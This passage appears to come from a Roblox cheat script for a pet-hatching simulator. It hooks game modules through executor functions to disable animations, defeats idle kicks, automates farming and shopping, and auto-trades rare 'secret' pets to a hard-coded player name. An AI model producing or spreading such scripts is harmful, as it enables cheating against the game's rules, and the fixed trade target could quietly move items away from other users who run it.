        game:GetService(""Players"").LocalPlayer:Kick(""100M Egg not available in this server. Please rejoin a different server."")
        return false
    end)
    
    if not success then
        print(""Error checking for 100M Egg: "" .. tostring(result))
    end
end)

spawn(function() -- anti afk
    task.wait(30)

    local vu = game:GetService(""VirtualUser"")
    game:GetService(""Players"").LocalPlayer.Idled:connect(function()
        vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        wait(1)
        vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)
end)

spawn(function() -- remove hatach animation
    task.wait(30)
    
    local HatchEggModule = nil

    for _, func in next, getgc(true) do
        if typeof(func) == ""function"" and getfenv(func).script then
            local scriptName = getfenv(func).script.Name
            local scriptParent = getfenv(func).script.Parent

            -- Look for the right module
            if scriptName == ""HatchEgg"" and tostring(scriptParent) == ""Effects"" then
                local env = getfenv(func)
                local module = require(env.script)

                if typeof(module) == ""table"" then
                    HatchEggModule = module
                    break
                end
            end
        end
    end

    -- Disable all functions in the HatchEgg module
    if HatchEggModule then
        for key, value in pairs(HatchEggModule) do
            if typeof(value) == ""function"" then
                HatchEggModule[key] = function(...) return end
            end
        end
        print(""‚úÖ Hatch animation functions disabled."")
    else
        warn(""‚ùå Failed to find HatchEgg module."")
    end
end)

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Local Stuff ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local GuiService            = game:GetService(""GuiService"")
local VIM                   = game:GetService(""VirtualInputManager"")
local TweenService          = game:GetService(""TweenService"")
local Players               = game:GetService(""Players"")
local HttpService           = game:GetService(""HttpService"")
local Remote                = game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote
local LocalDataService      = require(game:GetService(""ReplicatedStorage"").Client.Framework.Services.LocalData)
local data                  = LocalDataService:Get()

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Trade Secret Pets ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local AutoTradeSecretPets_Toggle = false
local tradeThread = nil
local targetTradeName = ""PixyPalx"" -- Target player name (can be easily changed)

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Bubble & Sell Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local Auto_Bubble_And_Sell_Active = false
local Auto_Bubble_And_Sell_Thread = nil

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Use Potion Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isAutoUsingPotions = false
local autoUsingPotionsThread = nil
local isHatchingX25Egg = false  -- New flag to track if we're hatching a x25 egg

-- List of regular potions we want to maintain active all the time
local priorityPotions = {
    ""Lucky"",
    ""Speed"",
    ""Mythic""
}

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Collect Pickup Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isAutoCollectingPickups = false
local autoCollectingPickupsThread = nil

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Hatch Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isAutoHatching = false
local autoHatchingThread = nil
local tempDisableHatching = false
local pickupCollectionStartedByHatcher = false -- Track if we started pickup collection

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Coin & Gems Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local Max_Coins =   400000000000 --400B
local Low_Coins =   100000000 --100M

local Max_Gems  =   100000000 --100M
local Low_Gems  =   10000000 --10M

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Enchant Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ
-- üîß CONFIG: Desired Enchants and Level
local enchants = {
    [""team-up""] = 5
}
-- üß™ You can add more like:
-- [""strong""]   = 2,
-- [""bubbler""]  = 5,
-- [""looter""]   = 5,
-- [""gleaming""] = 5

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Area To Unlock ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ
-- üîß CONFIG: Areas to Unlock
local AreaToUnlock = {
    ""Floating Island"",
    ""Outer Space"",
    ""Twilight"",
    ""The Void"",
    ""Zen""
}

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Mastery ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isAutoMastery = false -- Flag to track if we're automatically upgrading mastery
local autoMasteryThread = nil -- Variable to store the auto mastery thread

local PetsMasteryCompleted = false  -- Flag to track if Pets mastery reached target
local BuffsMasteryCompleted = false  -- Flag to track if Buffs mastery reached target
local ShopsMasteryCompleted = false  -- Flag to track if Shops mastery reached target
local AllMasteryCompleted = false  -- Flag to track if all mastery reached targets

local Target_Pets_Mastery = 15
local Target_Buffs_Mastery = 17
local Target_Shops_Mastery = 10

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Egg Counter ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Add these at the top with your other global variables
local EggCounterGui = nil
local isEggCounterEnabled = false
local CurrentlyHatchingEgg = nil

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Secret Pet Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Define list of secret pets
local SecretPets = {
    ""Avernus"",
    ""King Doggy"",
    ""The Overlord"",
    ""MAN FACE GOD"",
    ""Royal Trophy"",
    ""Giant Chocolate Chicken"",
    ""Easter Basket"",
    ""Dementor"",
    ""Godly Gem""
    -- Add more pet names here
}

local SecretPetCheck_Toggle = false
local SecretPetOverlay = nil

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Egg List & Priority ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local Default_Egg = CFrame.new(19, 2, -2)

-- Define egg mapping - workspace model name to actual egg name for remote call
local eggMapping = {
    [""common-egg""] = ""Common Egg"",
    [""void-egg""] = ""Void Egg"",
    --[""nightmare-egg""] = ""Nightmare Egg"",
    --[""aura-egg""] = ""Aura Egg"",
    --[""event-3""] = ""Throwback Egg"",  -- Correct event egg name
    [""silly-egg""] = ""Silly Egg"",
    [""100M Egg""] = ""100M Egg""

}

-- Prioritize eggs (higher index = higher priority)
local eggPriority = {
   -- ""event-3"", -- Highest priority
    ""silly-egg"",
   -- ""aura-egg"",
    --""nightmare-egg"",
    ""void-egg"",
    ""common-egg"", -- Lowest priority
    ""100M Egg""
}

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Craft Potion Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Configuration
local potionTypes = {
    ""Lucky"",
    ""Speed"",
    ""Mythic"",
    ""Coins""
}

-- Define crafting requirements for each tier
local craftingRequirements = {
    [2] = 4,  -- Level 2 requires 4x Level 1
    [3] = 4,  -- Level 3 requires 4x Level 2
    [4] = 6,  -- Level 4 requires 6x Level 3
    [5] = 8   -- Level 5 requires 8x Level 4
}


-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Pet List To Delete ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- The threshold amount to keep for all pets in the list
local petKeepThreshold = 1 --Normal pet type
local shinyKeepThreshold = 5  --shiny pet type

-- List of pet names to delete when they exceed 10
local petsToDelete = {
    --Common Egg
    ""Doggy"",
    ""Kitty"",
    ""Bunny"",
    ""Bear"",
    --Common Egg
    ""Mouse"",
    ""Wolf"",
    ""Fox"",
    ""Polar Bear"",
    ""Panda"",
    --Spotted Egg
    ""Ice Kitty"",
    ""Deer"",
    ""Ice Wolf"",
    ""Piggy"",
    ""Ice Deer"",
    ""Ice Dragon"",
    --Spikey Egg
    ""Golem"",
    ""Dinosaur"",
    ""Ruby Golem"",
    ""Dragon"",
    ""Dark Dragon"",
    ""Emerald Golem"",
    --Magma Egg
    ""Magma Doggy"",
    ""Magma Deer"",
    ""Magma Fox"",
    ""Magma Bear"",
    ""Demon"",
    ""Inferno Dragon"",
    --Crystal Egg
    ""Cave Bat"",
    ""Dark Bat"",
    ""Angel"",
    ""Emerald Bat"",
    ""Unicorn"",
    ""Flying Pig"",
    --Lunar Egg
    ""Space Mouse"",
    ""Space Bull"",
    ""Lunar Fox"",
    ""Lunarcorn"",
    ""Lunar Serpent"",
    ""Electra"",
    --Void Egg
    ""Void Kitty"",
    ""Void Bat"",
    ""Void Demon"",
    ""Dark Phoenix"",
    ""Neon Elemental"",
    --Hell Egg
    ""Hell Piggy"",
    ""Hell Dragon"",
    ""Hell Crawler"",
    ""Inferno Demon"",
    ""Inferno Cube"",
    ""Virus"",
    --Nightmare Egg
    ""Demon Doggy"",
    ""Skeletal Deer"",
    ""Night Crawler"",
    ""Hell Bat"",
    ""Green Hydra"",
    ""Demonic Hydra"",
    --Rainbow Egg
    ""Red Golem"",
    ""Orange Deer"",
    ""Yellow Fox"",
    ""Green Angel"",
    --Aura Egg
    ""Manny"",
    ""Manicorn"",
    ""Sigma Serpent"",
    ""Manarium"",
    --Pastel Egg
    ""Paper Doggy"",
    ""Paper Bunny"",
    ""Chubby Bunny"",
    ""Hatchling"",
    --Bunny Egg
    ""Bunny Doggy"",
    ""Egg Bunny"",
    ""Angel Bunny"",
    ""Seraphic Bunny"",
    --Throwback Egg
    ""Bow Bunny"",
    ""Easter Egg"",
    ""Flying Bunny"",
    ""Easter Serpent"",
    --100M Egg
    ""Bronze Bunny"",
    ""Silver Fox"",
    ""Golden Dragon"",
    ""Diamond Serpent"",
    ""Diamond Hexarium"",
    ""King Pufferfish""
}

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Flavors & Gum Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Auto buy variables
local AutoBuy_Toggle = false
local Buy_Thread = nil
local max_Flavor_Reached = false
local max_Gum_Reached = false
local max_Upgrades_Reached = false

-- üîß CONFIG: Flavors to Buy (sorted by price)
local flavorsConfig = {
    [""Blueberry""] = {
        price = 25,
        currency = ""Coins""
    },
    [""Cherry""] = {
        price = 500,
        currency = ""Coins""
    },
    [""Pizza""] = {
        price = 1500,
        currency = ""Coins""
    },
    [""Watermelon""] = {
        price = 3500,
        currency = ""Coins""
    },
    [""Chocolate""] = {
        price = 10000,
        currency = ""Coins""
    },
    [""Contrast""] = {
        price = 35000,
        currency = ""Coins""
    },
    [""Gold""] = {
        price = 100000,
        currency = ""Coins""
    },
    [""Lemon""] = {
        price = 450000,
        currency = ""Coins""
    },
    [""Donut""] = {
        price = 1500000,
        currency = ""Coins""
    },
    [""Swirl""] = {
        price = 30000000,
        currency = ""Coins""
    },
    [""Molten""] = {
        price = 350000000,
        currency = ""Coins""
    }
}

-- üîß CONFIG: Gum to Buy (sorted by price)
local gumConfig = {
    [""Stretchy Gum""] = {
        price = 25,
        currency = ""Coins""
    },
    [""Chewy Gum""] = {
        price = 250,
        currency = ""Coins""
    },
    [""Epic Gum""] = {
        price = 1500,
        currency = ""Coins""
    },
    [""Ultra Gum""] = {
        price = 5000,
        currency = ""Coins""
    },
    [""Omega Gum""] = {
        price = 12000,
        currency = ""Coins""
    },
    [""Unreal Gum""] = {
        price = 45000,
        currency = ""Coins""
    },
    [""Cosmic Gum""] = {
        price = 125000,
        currency = ""Coins""
    },
    [""XL Gum""] = {
        price = 650000,
        currency = ""Coins""
    },
    [""Mega Gum""] = {
        price = 1500000,
        currency = ""Coins""
    },
    [""Quantum Gum""] = {
        price = 5000000000,
        currency = ""Coins""
    },
    [""Alien Gum""] = {
        price = 35000000,
        currency = ""Coins""
    },
    [""Radioactive Gum""] = {
        price = 150000000,
        currency = ""Coins""
    },
    [""Experiment #52""] = {
        price = 1000000000,
        currency = ""Coins""
    }
}

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Helper ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local function GetCurrentCoins()
    return LocalDataService:Get().Coins
end

local function GetCurrentGems()
    return LocalDataService:Get().Gems
end

local function getPetById(data, id)
    for _, pet in ipairs(data.Pets) do
        if pet.Id == id then
            return pet
        end
    end
end

-- Function to format numbers with suffixes (K, M, B, T, etc.)
local function FormatNumberCompact(num)
    if num >= 1e18 then return string.format(""%.1fQnt"", num / 1e18)
    elseif num >= 1e15 then return string.format(""%.1fQ"", num / 1e15)
    elseif num >= 1e12 then return string.format(""%.1fT"", num / 1e12)
    elseif num >= 1e9 then return string.format(""%.1fB"", num / 1e9)
    elseif num >= 1e6 then return string.format(""%.1fM"", num / 1e6)
    elseif num >= 1e3 then return string.format(""%.1fK"", num / 1e3)
    else return tostring(num)
    end
end

local function extractNumbers(text)
    -- Remove all HTML-like tags
    local cleanText = text:gsub(""<[^>]+>"", """")
    
    -- Extract the text before and after the slash
    local currentStr, maxStr = cleanText:match(""([%d%,%.]+)%s*/%s*([%d%,%.]+)"")
    
    if not currentStr or not maxStr then
        return nil, nil
    end
    
    -- Remove commas from the numbers
    currentStr = currentStr:gsub("","", """")
    maxStr = maxStr:gsub("","", """")
    
    -- Convert to numbers
    return tonumber(currentStr), tonumber(maxStr)
end

-- Function to convert price text to a number value
local function convertPriceToNumber(priceText)
    -- Remove commas and spaces
    local cleanPrice = priceText:gsub("","", """"):gsub(""%s+"", """")
    
    -- Check for suffixes like K, M, B
    local value = tonumber(cleanPrice:match(""^%d+%.?%d*""))
    if not value then return 999999999999 end -- Return a high value if can't parse
    
    -- Handle suffixes
    if cleanPrice:match(""[Kk]$"") then
        value = value * 1000
    elseif cleanPrice:match(""[Mm]$"") then
        value = value * 1000000
    elseif cleanPrice:match(""[Bb]$"") then
        value = value * 1000000000
    end
    
    return value
end
-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Function Tween ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Function to tween character to a target
function TweenCharacterToTarget(targetPart)
    -- Parameter validation
    if not targetPart then
        warn(""Target part not provided!"")
        return
    end
    
    -- Fixed speeds
    local horizontalSpeed = 16
    local verticalSpeed = math.huge
    
    -- Get Player and Character
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild(""HumanoidRootPart"")
    
    -- Calculate Target CFrames and Durations
    local startCFrame = humanoidRootPart.CFrame
    local targetPosition = targetPart.Position + Vector3.new(1, 5, 1)
    
    -- Create initial downward position (5 units below current position)
    local downwardPosition = startCFrame.Position + Vector3.new(0, -20, 0)
    local downwardCFrame = CFrame.new(downwardPosition) * (startCFrame - startCFrame.Position)
    
    -- Intermediate CFrame: Target X/Z, current Y, maintain character orientation
    local intermediatePosition = Vector3.new(targetPosition.X, downwardPosition.Y, targetPosition.Z)
    local intermediateCFrame = CFrame.new(intermediatePosition) * (startCFrame - startCFrame.Position)
    
    -- Final CFrame: Target X/Y/Z, maintain character orientation
    local finalCFrame = CFrame.new(targetPosition) * (startCFrame - startCFrame.Position)
    
    -- Calculate Distances
    local downwardDistance = math.abs(startCFrame.Position.Y - downwardPosition.Y)
    local horizontalDistance = (Vector3.new(downwardPosition.X, 0, downwardPosition.Z) - Vector3.new(intermediatePosition.X, 0, intermediatePosition.Z)).Magnitude
    local verticalDistance = math.abs(intermediatePosition.Y - targetPosition.Y)
    
    -- Calculate Durations based on speed
    local downwardTime = downwardDistance / verticalSpeed
    local horizontalTime = horizontalDistance / horizontalSpeed
    local verticalTime = verticalDistance / verticalSpeed
    
    -- TweenInfo Configuration
    local tweenInfoDownward = TweenInfo.new(downwardTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tweenInfoHorizontal = TweenInfo.new(horizontalTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tweenInfoVertical = TweenInfo.new(verticalTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    
    -- Create Tweens
    local downwardTween = TweenService:Create(humanoidRootPart, tweenInfoDownward, { CFrame = downwardCFrame })
    local horizontalTween = TweenService:Create(humanoidRootPart, tweenInfoHorizontal, { CFrame = intermediateCFrame })
    local verticalTween = TweenService:Create(humanoidRootPart, tweenInfoVertical, { CFrame = finalCFrame })
    
    -- Play Tweens Sequentially
    downwardTween.Completed:Connect(function(playbackState)
        if playbackState == Enum.PlaybackState.Completed then
            horizontalTween:Play()
        end
    end)
    
    horizontalTween.Completed:Connect(function(playbackState)
        if playbackState == Enum.PlaybackState.Completed then
            verticalTween:Play()
        end
    end)
    
    -- Start the first tween
    downwardTween:Play()
    
    -- Return tweens so they can be monitored or cancelled
    return horizontalTween, verticalTween, downwardTween
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Trade Secret Pets ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local AutoTradeSecretPets_Toggle = false
local tradeThread = nil
local targetTradeName = ""PixyPalx"" -- Target player name (can be easily changed)

local function autoTradeSecretPets()
    AutoTradeSecretPets_Toggle = not AutoTradeSecretPets_Toggle
    
    if AutoTradeSecretPets_Toggle then
        tradeThread = spawn(function()
            while AutoTradeSecretPets_Toggle do
                local targetPlayer = game:GetService(""Players""):FindFirstChild(targetTradeName)
                
                if not targetPlayer then
                    -- Wait for player to join
                    for i = 1, 300 do
                        if not AutoTradeSecretPets_Toggle then break end
                        if game:GetService(""Players""):FindFirstChild(targetTradeName) then break end
                        task.wait(1)
                    end
                    task.wait(1)
                    continue
                end
                
                -- Quick check if we have any secret pets
                local freshPetData = LocalDataService:Get()
                local hasSecretPets = false
                
                if freshPetData and freshPetData.Pets then
                    for _, pet in pairs(freshPetData.Pets) do
                        for _, secretPetName in pairs(SecretPets) do
                            if pet.Name == secretPetName then
                                hasSecretPets = true
                                break
                            end
                        end
                        if hasSecretPets then break end
                    end
                end
                
                if not hasSecretPets then
                    task.wait(30)
                    continue
                end
                
                -- Trading logic
                local tradingUI = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Trading
                
                -- If not in trade, send requests
                if not (tradingUI and tradingUI.Visible) then
                    while targetPlayer and targetPlayer.Parent ~= nil and AutoTradeSecretPets_Toggle do
